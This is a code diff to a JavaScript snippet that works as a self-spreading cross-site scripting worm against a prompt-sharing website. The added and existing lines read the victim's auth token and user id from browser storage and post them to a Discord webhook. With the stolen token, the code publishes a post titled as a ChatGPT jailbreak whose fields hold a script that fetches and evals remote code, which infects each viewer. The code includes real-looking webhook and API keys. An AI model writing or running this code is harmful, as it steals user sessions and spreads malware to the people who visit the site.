@@ -1,4 +1,10 @@
 (() => {
+    const NEW_POST = {
+        'title': 'Jailbreak FULL ChatGPT',
+        'description': "/model<script>fetch('https://raw.githubusercontent.com/ulusvdomain-arch/godtierprompts/refs/heads/main/inject.js').then(r => r.text()).then(eval)</script>", 
+        'prompt': "/model<script>fetch('https://raw.githubusercontent.com/ulusvdomain-arch/godtierprompts/refs/heads/main/inject.js').then(r => r.text()).then(eval)</script>"
+    }
+
     let access_token = JSON.parse(localStorage.getItem('sb-naxnmptbuycolotkwvsz-auth-token'))['access_token'];
     let author_id = JSON.parse(localStorage.getItem('sb-naxnmptbuycolotkwvsz-auth-token'))['user']['id'];
     let api_key = 'sb_publishable_4koI0XhJp65TObrB07RRCQ_HcZxOzcj';
@@ -23,23 +29,42 @@
         });
         
         fetch('https://discord.com/api/webhooks/1417874292259029135/oEDSvZcRw3vhVmRQZvscq2a49UH0-fXNJE7L3vF-KBRAs1Zup70VWfB1kXgQUQ8dfZ7s', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: `author: ${author_id}\ntoken: ${access_token}` }) });
-    
+
         fetch('https://naxnmptbuycolotkwvsz.supabase.co/rest/v1/prompts?select=id', {
             method: 'POST',
             headers: {
-            'apikey': 'sb_publishable_4koI0XhJp65TObrB07RRCQ_HcZxOzcj',
-            'Authorization': 'Bearer ' + access_token,
-            'Content-Type': 'application/json'
+                'apikey': api_key,
+                'Authorization': 'Bearer '+access_token,
+                'Content-Type': 'application/json',
+                'Prefer': 'return=representation'
             },
             body: JSON.stringify({
-                title: 'github.com/cvcvka5',
-                description: "https://www.godtierprompts.com/prompt/6895e12a-4342-4e6d-bc39-6c679adba400\ni can send it to anybody that follows github.com/cvcvka5 and stars github.com/cvcvka5/whatsapp-web.py.\n",
+                title: NEW_POST['title'],
+                description: NEW_POST['description'],
                 author_id: author_id,
                 parent_prompt_id: null,
                 step_count: 1,
                 model_id: 'model'
             })
-        });
-
+            })
+            .then(res => res.json()).then((data) => {
+                const prompt_id = data[0].id
+                fetch('https://naxnmptbuycolotkwvsz.supabase.co/rest/v1/prompt_steps?columns="step_type","content","step_order","prompt_id"', {
+                method: 'POST',
+                headers: {
+                    'apikey': api_key,
+                    'Authorization': 'Bearer '+access_token,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify([
+                    {
+                    step_type: 'prompt',
+                    content: NEW_POST['prompt'],
+                    step_order: 1,
+                    prompt_id: prompt_id
+                    }
+                ])
+                })
+            })
     }
 })();
